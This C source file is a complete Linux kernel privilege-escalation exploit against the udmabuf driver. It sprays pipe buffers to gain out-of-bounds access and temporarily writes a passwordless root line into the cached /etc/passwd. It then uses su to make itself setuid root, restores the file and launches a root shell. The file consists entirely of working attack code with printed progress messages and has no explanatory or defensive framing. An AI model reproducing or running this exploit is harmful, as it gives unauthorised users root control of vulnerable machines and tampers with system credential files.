#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/mman.h>

#include <err.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/ioctl.h>

#include <sys/uio.h>

#include <string.h>

#include <sys/types.h>
#include <sys/wait.h>

#define PAGE_SIZE 4096

#define N_PAGES_ALLOC 128

#define N_PIPES_SPRAY 256

struct udmabuf_create
{
  uint32_t memfd;
  uint32_t flags;
  uint64_t offset;
  uint64_t size;
};

#define UDMABUF_CREATE _IOW('u', 0x42, struct udmabuf_create)

int main(int argc, char* argv[argc+1])
{
  if (geteuid() == 0)
  {
    printf("[+] backdoor triggered successfully!\n");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/sh");
    exit(EXIT_SUCCESS);
  }

  int mem_fd = memfd_create("test", MFD_ALLOW_SEALING);
  if (mem_fd < 0)
    errx(1, "couldn't create anonymous file");
  
  /* setup size of anonymous file, the initial size was 0 */
  if (ftruncate(mem_fd, PAGE_SIZE * N_PAGES_ALLOC) < 0)
    errx(1, "couldn't truncate file length");

  /* make sure the file cannot be reduced in size */
  if (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) < 0)
    errx(1, "couldn't seal file");

  printf("[*] anon file fd=%d (%#x bytes)\n", mem_fd, PAGE_SIZE * N_PAGES_ALLOC);

  int target_fd = open("/etc/passwd", O_RDONLY);
  if (target_fd < 0)
    errx(1, "couldn't open target file");

  /* create a read-only shared mapping avoiding CoW */
  void* target_map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, target_fd, 0);
  if (target_map == MAP_FAILED)
    errx(1, "couldn't map target file");

  printf("[*] target file mapped at %p (%#x bytes)\n", target_map, PAGE_SIZE);

  int dev_fd = open("/dev/udmabuf", O_RDWR);
  if (dev_fd < 0)
    errx(1, "couldn't open device");

  printf("[*] udmabuf device fd=%d\n", dev_fd);

  size_t attempt = 0;

  int end = 0;
  while (! end)
  {
    printf("[!] attempt %zu\n", attempt++);

    /* spray pipes, by default the pipe buffers array land on kmalloc-1024 */
    int pipe_fds[N_PIPES_SPRAY][2] = { 0 };
    for (int i=0; i < N_PIPES_SPRAY; i++)
    {
      if (pipe(pipe_fds[i]) < 0)
        errx(1, "couldn't create pipe");
    }

    printf("[*] sprayed %d pipes\n", N_PIPES_SPRAY);

    /* shrink some pipes making holes in kmalloc-1024 */
    for (int i=0; i < N_PIPES_SPRAY; i++)
    {
      if (i % 2 == 0)
      {
        if (fcntl(pipe_fds[i][0], F_SETPIPE_SZ, PAGE_SIZE) < 0)
          errx(1, "couldn't shrink pipe");
      } 
    }

    struct udmabuf_create create = { 0 };
    create.memfd = mem_fd;
    create.size  = PAGE_SIZE * N_PAGES_ALLOC;
   
    /* reallocate one of the freed holes in kmalloc-1024 */
    int udmabuf_fd = ioctl(dev_fd, UDMABUF_CREATE, &create);
    if (udmabuf_fd < 0)
      errx(1, "couldn't create udmabuf");

    printf("[*] udmabuf fd=%d\n", udmabuf_fd);

    /* vmsplice to all pipes, should grab a page reference and
     * put the page pointer inside the pipe buf. hopefully one
     * of this is just after our pages array */
    for (int i=0; i < N_PIPES_SPRAY; i++)
    {
      struct iovec iov = {
        .iov_base = target_map,
        .iov_len  = PAGE_SIZE,
      };

      if (vmsplice(pipe_fds[i][1], &iov, 1, 0) < 0)
        errx(1, "couldn't splice target page into pipes");
    }

    /* map the udmabuf into userspace */
    void* udmabuf_map = mmap(NULL, PAGE_SIZE * N_PAGES_ALLOC,
        PROT_READ|PROT_WRITE, MAP_SHARED, udmabuf_fd, 0);
    if (udmabuf_map == MAP_FAILED)
      errx(1, "couldn't map udmabuf");

    printf("[*] udmabuf mapped at %p (%#x bytes)\n", 
        udmabuf_map, PAGE_SIZE * N_PAGES_ALLOC);

    /* remap the virtual mapping expanding its size */
    void* new_udmabuf_map = mremap(udmabuf_map,
        PAGE_SIZE * N_PAGES_ALLOC, PAGE_SIZE * N_PAGES_ALLOC * 2, MREMAP_MAYMOVE);
    if (new_udmabuf_map == MAP_FAILED)
      errx(1, "couldn't remap udmabuf mapping");

    printf("[*] udmabuf map expanded at %p (%#x bytes)\n", new_udmabuf_map,
        PAGE_SIZE * N_PAGES_ALLOC * 2);

    /* we should be out-of-bounds of the pages array */
    char* ptr = new_udmabuf_map + PAGE_SIZE * N_PAGES_ALLOC;

    pid_t pid = fork();
    if (pid < 0)
      errx(1, "couldn't fork");

    if (! pid)
    {
      /* check if the oob succeded */
      if (! memcmp(ptr, "root", 4))
        exit(EXIT_SUCCESS);
      exit(EXIT_FAILURE);
    }

    int wstatus = -1;
    if (waitpid(pid, &wstatus, 0) < 0)
      errx(1, "couldn't wait for child");

    if ((end = ! wstatus))
    {
      printf("[+] heap spraying succeded\n");

      char backdoor[] = "root::0:0:xroot:/root:/bin/bash";
      char backup[sizeof(backdoor)] = { 0 };

      memcpy(backup, ptr, sizeof(backup));
      memcpy(ptr, backdoor, sizeof(backdoor));

      printf("[*] backdoor installed\n");

      char cmd[512];
      sprintf(cmd, "su -c \"chown root:root %s && chmod u+s %s\"", 
          argv[0], argv[0]);
      printf("[*] payload=%s\n", cmd);
      system(cmd);

      memcpy(ptr, backup, sizeof(backup));
      printf("[*] backup restored\n");     
    }
    else
    {
      printf("[-] heap spraying failed\n");

      /* roll back, we need to spray again */
      munmap(new_udmabuf_map, PAGE_SIZE * N_PAGES_ALLOC * 2);

      close(udmabuf_fd);

      for (int i=0; i < N_PIPES_SPRAY; i++)
      {
        close(pipe_fds[i][0]);
        close(pipe_fds[i][1]);
      }
    }
  }

  system(argv[0]);

  return EXIT_SUCCESS;
}
